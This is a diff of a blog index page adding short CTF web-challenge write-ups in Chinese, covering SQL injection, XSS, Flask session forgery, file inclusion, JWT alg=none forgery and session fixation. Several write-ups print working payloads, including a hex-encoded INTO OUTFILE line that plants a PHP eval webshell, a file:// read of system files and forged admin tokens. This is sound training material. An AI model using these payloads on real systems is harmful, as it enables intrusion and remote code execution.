@@ -181,8 +181,8 @@
         
 
 <div class="post">
-    <a href="/2026/03/16/ctf%E7%A7%80web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4%E9%A2%98%E8%A7%A3/">
-        <h2 class="post-title">ctfshow web应用安全与防护题解</h2>
+    <a href="/2026/05/15/2026-05-15-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99Shell/">
+        <h2 class="post-title">堆叠注入写Shell甄洪琳</h2>
     </a>
     <div class="category-and-date">
         
@@ -190,7 +190,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2026/3/16
+            2026/5/15
         </span>
         
         
@@ -198,28 +198,357 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h2 id="Base64编码隐藏"><a href="#Base64编码隐藏" class="headerlink" title="Base64编码隐藏"></a>Base64编码隐藏</h2><p>打开题目f12查看源码发现密码被base64加密</p>
-<p><img src="/images/ctfshow/1773670223912.png" alt="1773670223912"></p>
-<p>解码得到密码</p>
-<p><img src="/images/ctfshow/1773670666647.png" alt="1773670666647"></p>
-<p>登录得到flag</p>
-<p><img src="/images/ctfshow/1773670740030.png" alt="1773670740030"></p>
-<h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><p>f12查看源码发现密码被base64加密</p>
-<p><img src="/images/ctfshow/1773670223912.png" alt="1773670223912"></p>
-<p>解码得到密码</p>
-<p><img src="/images/ctfshow/1773670666647.png" alt="1773670666647"></p>
-<p>登录提示只能ctf-show-brower登录</p>
-<p><img src="/images/ctfshow/1773671083716.png" alt="1773671083716"></p>
-<p>这里抓包修改（靶场默认开启https，删除s切换回http再抓包）</p>
-<p><img src="/images/ctfshow/1773671245832.png" alt="1773671245832"></p>
-<p>发送请求包得到flag</p>
-<p><img src="/images/ctfshow/1773671327314.png" alt="1773671327314"></p>
-<h2 id="Base64多层嵌套解码"><a href="#Base64多层嵌套解码" class="headerlink" title="Base64多层嵌套解码"></a>Base64多层嵌套解码</h2><p>这里步骤跟“HTTP头注入”一样，只是中间的解码的步骤复杂了一些</p>
-<p>第1步逆向：Base64解码 text atob(“SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU&#x3D;”)</p>
-<p>第2步逆向：这一步是 btoa(‘aB3’ + encoded + ‘qW9’).substr(2) 对第1步结果Base64解码 得到完整字符串，前面补回2个字符 去掉开头的”aB3”和结尾的”qW9”</p>
-<p>第3步逆向：这一步是 btoa(encoded.split(‘’).reverse().join(‘’)) 对第2步结果Base64解码 将字符串反转 </p>
-<p>第4步逆向：这一步是 btoa(encoded + ‘xH7jK’).slice(3) 对第3步结果Base64解码 开头补回3个字符 去掉结尾的”xH7jK”</p>
-<p>第5步逆向：最后Base64解码，得到原始密码</p>
+            <p>打开是一个登录界面</p>
+<p><img src="/images/writeups/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99Shell%E7%94%84%E6%B4%AA%E7%90%B3_efc21db4.png" alt="堆叠注入写Shell甄洪琳_efc21db4"></p>
+<p>这里尝试写一个木马进去，把木马进行hex编码进行绕过</p>
+<p>username&#x3D;admin\</p>
+<p>password&#x3D;;select 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e into outfile “&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php”;%23 </p>
+<p><img src="/images/writeups/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99Shell%E7%94%84%E6%B4%AA%E7%90%B3_5fefa39a.png" alt="堆叠注入写Shell甄洪琳_5fefa39a"></p>
+<p>上传完之后尝试使用木马获得flag</p>
+<p><img src="/images/writeups/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99Shell%E7%94%84%E6%B4%AA%E7%90%B3_4d813d7f.png" alt="堆叠注入写Shell甄洪琳_4d813d7f"></p>
+<p>CTF{sql_injection_is_fun}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ffa2c4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #03a9f4">SQL注入</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Webshell/" style="color: #00bcd4">Webshell</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/15/2026-05-15-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%86%99Shell/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/15/2026-05-15-%E6%B7%B7%E5%90%88%E5%9E%8BXSS/">
+        <h2 class="post-title">混合型XSS甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>打开题目发现有一些提示，要得到管理员密码</p>
+<p><img src="/images/writeups/%E6%B7%B7%E5%90%88%E5%9E%8BXSS%E7%94%84%E6%B4%AA%E7%90%B3_c40e187a.png" alt="混合型XSS甄洪琳_c40e187a"></p>
+<p>点击开始进入一个登入界面</p>
+<p><img src="/images/writeups/%E6%B7%B7%E5%90%88%E5%9E%8BXSS%E7%94%84%E6%B4%AA%E7%90%B3_7cdd52db.png" alt="混合型XSS甄洪琳_7cdd52db"></p>
+<p>注册一个账号发现可以改个性签名看看有没有xss漏洞</p>
+<p><img src="/images/writeups/%E6%B7%B7%E5%90%88%E5%9E%8BXSS%E7%94%84%E6%B4%AA%E7%90%B3_4c55607d.png" alt="混合型XSS甄洪琳_4c55607d"></p>
+<p>根据回现发现存在xss漏洞</p>
+<p><img src="/images/writeups/%E6%B7%B7%E5%90%88%E5%9E%8BXSS%E7%94%84%E6%B4%AA%E7%90%B3_131d6e13.png" alt="混合型XSS甄洪琳_131d6e13"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/XSS/" style="color: #00bcd4">XSS</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/15/2026-05-15-%E6%B7%B7%E5%90%88%E5%9E%8BXSS/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/15/2026-05-15-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
+        <h2 class="post-title">联合查询注入甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>打开题目发现是一个页面列表</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_604788e4.png" alt="联合查询注入甄洪琳_604788e4"></p>
+<p>点进去发现有一个id参数</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_90da9414.png" alt="联合查询注入甄洪琳_90da9414"></p>
+<p>测试了一下发现可以注入</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_77278866.png" alt="联合查询注入甄洪琳_77278866"></p>
+<p>先查字段数</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_79c7a0db.png" alt="联合查询注入甄洪琳_79c7a0db"></p>
+<p>然后查表名，得到pages和users</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_681d53db.png" alt="联合查询注入甄洪琳_681d53db"></p>
+<p>再查users中的列名</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_a25ec514.png" alt="联合查询注入甄洪琳_a25ec514"></p>
+<p>这里查id和username都没查到有用信息</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_4b3629d4.png" alt="联合查询注入甄洪琳_4b3629d4"></p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_e9af4873.png" alt="联合查询注入甄洪琳_e9af4873"></p>
+<p>Flag在password中</p>
+<p><img src="/images/writeups/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%94%84%E6%B4%AA%E7%90%B3_1a211d1b.png" alt="联合查询注入甄洪琳_1a211d1b"></p>
+<p>CTF{admin_secret_password}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #ff7d73">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="color: #00bcd4">SQL注入</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/15/2026-05-15-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/10/2026-05-10-Flask_Session%E4%BC%AA%E9%80%A0/">
+        <h2 class="post-title">Flask_Session伪造甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>题目显示可以读取网页</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_35153660.png" alt="Flask_Session伪造甄洪琳_35153660"></p>
+<p>点击后会跳转百度，查看源码发现这里有一个url参数</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_b0f33032.png" alt="Flask_Session伪造甄洪琳_b0f33032"></p>
+<p>用file协议可以读取文件</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_a47c83c8.png" alt="Flask_Session伪造甄洪琳_a47c83c8"></p>
+<p>题目叫Flask_Session伪造,需要secret_key，一般在app.py中</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_1917bde4.png" alt="Flask_Session伪造甄洪琳_1917bde4"></p>
+<p>这里需要admin签名的cookie才能访问&#x2F;flag，所以需要先得到mac地址，然后算secret_key，再去伪造{‘username’:’admin’} 的签名 Cookie，最后替换cookie访问&#x2F;flag。因为可以读取文件，先看看能不能直接读网卡信息得到mac地址。</p>
+<p>Payload：&#x2F;read?url&#x3D;file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_a8f6fd1e.png" alt="Flask_Session伪造甄洪琳_a8f6fd1e"><br>用脚本计算secret_key</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_022c0a7c.png" alt="Flask_Session伪造甄洪琳_022c0a7c"></p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_99a6de20.png" alt="Flask_Session伪造甄洪琳_99a6de20"></p>
+<p>得到secret_key为0.5088633266314257，用flask-session-cookie-manager伪造session</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_8db25bcb.png" alt="Flask_Session伪造甄洪琳_8db25bcb"></p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_259c58df.png" alt="Flask_Session伪造甄洪琳_259c58df"></p>
+<p>eyJ1c2VybmFtZSI6ImFkbWluIn0.af_3Mw.CpCI19wit_JWsNvwVA5W5vmcaZw </p>
+<p>修改cookie访问&#x2F;flag获得flag</p>
+<p><img src="/images/writeups/Flask_Session%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_4a2b7b59.png" alt="Flask_Session伪造甄洪琳_4a2b7b59"></p>
+<p>CTF{flask_session_is_secure}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Flask/" style="color: #00a596">Flask</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Session/" style="color: #03a9f4">Session</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/10/2026-05-10-Flask_Session%E4%BC%AA%E9%80%A0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/10/2026-05-10-GET-POST/">
+        <h2 class="post-title">GET-POST甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>题目要求用GET方式传id&#x3D;1</p>
+<p><img src="/images/writeups/GET-POST%E7%94%84%E6%B4%AA%E7%90%B3_ab99f851.png" alt="GET-POST甄洪琳_ab99f851"></p>
+<p>用GET传id&#x3D;1后又要POST传jljcxy&#x3D;flag</p>
+<p><img src="/images/writeups/GET-POST%E7%94%84%E6%B4%AA%E7%90%B3_618adc56.png" alt="GET-POST甄洪琳_618adc56"></p>
+<p>这里再POST传一个jljcxy&#x3D;flag，得到flag</p>
+<p><img src="/images/writeups/GET-POST%E7%94%84%E6%B4%AA%E7%90%B3_e6ac864e.png" alt="GET-POST甄洪琳_e6ac864e"></p>
+<p>flag{a52b7cac3af0b081349001c92d79cc0a}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/10/2026-05-10-GET-POST/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/10/2026-05-10-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+        <h2 class="post-title">临时文件包含甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>输入这个不存在的临时文件路径&#x2F;tmp&#x2F;sess_123</p>
+<p><img src="/images/writeups/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_42fcc031.png" alt="临时文件包含甄洪琳_42fcc031"></p>
+<p>发现&#x2F;tmp和sess不受限制，这里可以利用脚本上传临时文件在临时文件被删除之前包含执行php代码</p>
+<p><img src="/images/writeups/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_095896a2.png" alt="临时文件包含甄洪琳_095896a2"></p>
+<p>成功包含后用蚁剑连接上传的木马</p>
+<p><img src="/images/writeups/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_b640a748.png" alt="临时文件包含甄洪琳_b640a748"></p>
+<p>在当前目录下找到flag</p>
+<p><img src="/images/writeups/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_65bd719d.png" alt="临时文件包含甄洪琳_65bd719d"></p>
+<p><img src="/images/writeups/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%94%84%E6%B4%AA%E7%90%B3_d95cf626.png" alt="临时文件包含甄洪琳_d95cf626"></p>
+<p>CTF{fileupload_temp_file_include_success}</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #03a9f4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00bcd4">文件包含</a>
+        </span>
+        
+    </div>
+    <a href="/2026/05/10/2026-05-10-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2026/05/10/2026-05-10-%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99/">
+        <h2 class="post-title">被黑掉的站甄洪琳</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/5/10
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>打开题目告诉我们网站被黑了，有很多的马</p>
+<p><img src="/images/writeups/%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99%E7%94%84%E6%B4%AA%E7%90%B3_f83981a8.png" alt="被黑掉的站甄洪琳_f83981a8"></p>
+<p>看了源码和请求响应都没有有用信息，用dirsearch扫描后台发现一个shell.php和index.php.bak ，一个是shell的登录界面一个是字符串应该是密码字典</p>
+<p><img src="/images/writeups/%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99%E7%94%84%E6%B4%AA%E7%90%B3_45d8cc45.png" alt="被黑掉的站甄洪琳_45d8cc45"></p>
+<p><img src="/images/writeups/%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99%E7%94%84%E6%B4%AA%E7%90%B3_ffd6be9b.png" alt="被黑掉的站甄洪琳_ffd6be9b"></p>
+<p>直接抓包爆破，先设置好payload</p>
+<p><img src="/images/writeups/%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99%E7%94%84%E6%B4%AA%E7%90%B3_6663d663.png" alt="被黑掉的站甄洪琳_6663d663"></p>
+<p>开始爆破，找到正确密码的响应得到flag</p>
+<p><img src="/images/writeups/%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99%E7%94%84%E6%B4%AA%E7%90%B3_51a2c445.png" alt="被黑掉的站甄洪琳_51a2c445"></p>
+<p>flag{8e539a7a46fea05dea18b9b9f9ff6a63}	</p>
 
             
         </div>
@@ -238,12 +567,12 @@
         </span>
         
     </div>
-    <a href="/2026/03/16/ctf%E7%A7%80web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4%E9%A2%98%E8%A7%A3/" class="go-post">阅读全文</a>
+    <a href="/2026/05/10/2026-05-10-%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%AB%99/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2026/03/10/%E6%8C%96%E6%B4%9E%E7%AC%94%E8%AE%B0/">
-        <h2 class="post-title">漏洞挖掘学习笔记</h2>
+    <a href="/2026/05/08/2026-05-08-JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0/">
+        <h2 class="post-title">JWT令牌伪造甄洪琳</h2>
     </a>
     <div class="category-and-date">
         
@@ -251,7 +580,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2026/3/10
+            2026/5/8
         </span>
         
         
@@ -259,12 +588,25 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h2 id="int类型"><a href="#int类型" class="headerlink" title="int类型"></a>int类型</h2><p>2147483648&#x3D;0</p>
-<h2 id="科学计数法"><a href="#科学计数法" class="headerlink" title="科学计数法"></a>科学计数法</h2><p>x为任意正整数<br>1e-x绕过检测让数为小数<br>1e+x绕过最大输入位数</p>
-<h2 id="四舍五入"><a href="#四舍五入" class="headerlink" title="四舍五入"></a>四舍五入</h2><p>例子：平台充值0.014第三方最小到0.01支付0.01实际到账0.014</p>
-<h2 id="Pirce"><a href="#Pirce" class="headerlink" title="Pirce"></a>Pirce</h2><p>可以尝试将参数修改成不正常的值（如：-1，0.01，0.019）</p>
-<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>找到能够越权的参数比如userid、couponid、address</p>
-<h2 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h2>
+            <p>题目提示伪造 JWT 令牌，获取管理员权限</p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_0e3700b9.png" alt="JWT令牌伪造甄洪琳_0e3700b9"></p>
+<p>登录抓包</p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_ffc455b7.png" alt="JWT令牌伪造甄洪琳_ffc455b7"></p>
+<p>JWT令牌分为三段</p>
+<p>1、eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
+<p>2、eyJ1c2VyIjoic3NzIiwiYWRtaW4iOmZhbHNlfQ</p>
+<p>3、m8V_HNSI65wv2XVsZlxjFapXhxILIgwSrqkMv4wdxBg</p>
+<p>第一段解码后为{“alg”:”HS256”,”typ”:”JWT”}，题目提示修改alg字段为none绕过签名验证</p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_66674c61.png" alt="JWT令牌伪造甄洪琳_66674c61"></p>
+<p>第二段解码后为{“user”:”sss”,”admin”:false}，第三段解码后为乱码估计是验证部分，所以这里根据题目提示修改alg字段绕过验证,第三段因为绕过验证了所以不用加上</p>
+<p>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0&#x3D;.eyJ1c2VyIjoic3NzIiwiYWRtaW4iOnRydWV9.</p>
+<p>抓登录包修改token，这里登录包后面还有一个包也需要修改</p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_63e98977.png" alt="JWT令牌伪造甄洪琳_63e98977"></p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_2f1bee0a.png" alt="JWT令牌伪造甄洪琳_2f1bee0a"></p>
+<p>修改完后得到flag</p>
+<p><img src="/images/writeups/JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0%E7%94%84%E6%B4%AA%E7%90%B3_bfbe2285.png" alt="JWT令牌伪造甄洪琳_bfbe2285"></p>
+<p>CTF{jwt_none_alg_bypass_success}</p>
+
             
         </div>
     </div>
@@ -278,16 +620,26 @@
         
         <span class="tag">
             
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="color: #03a9f4">漏洞挖掘</a>
+            <a href="/tags/%E9%A2%98%E8%A7%A3/" style="color: #00bcd4">题解</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/JWT/" style="color: #ff7d73">JWT</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/Session/" style="color: #ffa2c4">Session</a>
         </span>
         
     </div>
-    <a href="/2026/03/10/%E6%8C%96%E6%B4%9E%E7%AC%94%E8%AE%B0/" class="go-post">阅读全文</a>
+    <a href="/2026/05/08/2026-05-08-JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2026/01/02/hello-world/">
-        <h2 class="post-title">Hello World</h2>
+    <a href="/2026/05/08/2026-05-08-Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB/">
+        <h2 class="post-title">Session固定攻击甄洪琳</h2>
     </a>
     <div class="category-and-date">
         
@@ -295,7 +647,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2026/1/2
+            2026/5/8
         </span>
         
         
@@ -303,29 +655,95 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="hallo-hexo"><a href="#hallo-hexo" class="headerlink" title="hallo hexo"></a>hallo hexo</h2><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+            <p>打开题目发现可以登录，和给管理员发消息，还提示测试账号和flag在管理员页面</p>
+<p><img src="/images/writeups/Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E7%94%84%E6%B4%AA%E7%90%B3_d4625a96.png" alt="Session固定攻击甄洪琳_d4625a96"></p>
+<p>先登录上test账号，然后给管理员发消息，这里要直接的session id</p>
+<p><img src="/images/writeups/Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E7%94%84%E6%B4%AA%E7%90%B3_3b7e42fd.png" alt="Session固定攻击甄洪琳_3b7e42fd"></p>
+<p>在cookie中找到自己的session</p>
+<p><img src="/images/writeups/Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E7%94%84%E6%B4%AA%E7%90%B3_db98ad1a.png" alt="Session固定攻击甄洪琳_db98ad1a"></p>
+<p>给管理员发消息</p>
+<p><img src="/images/writeups/Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E7%94%84%E6%B4%AA%E7%90%B3_0e9f2c21.png" alt="Session固定攻击甄洪琳_0e9f2c21"></p>
+<p>返回开始界面，刷新得到flag</p>
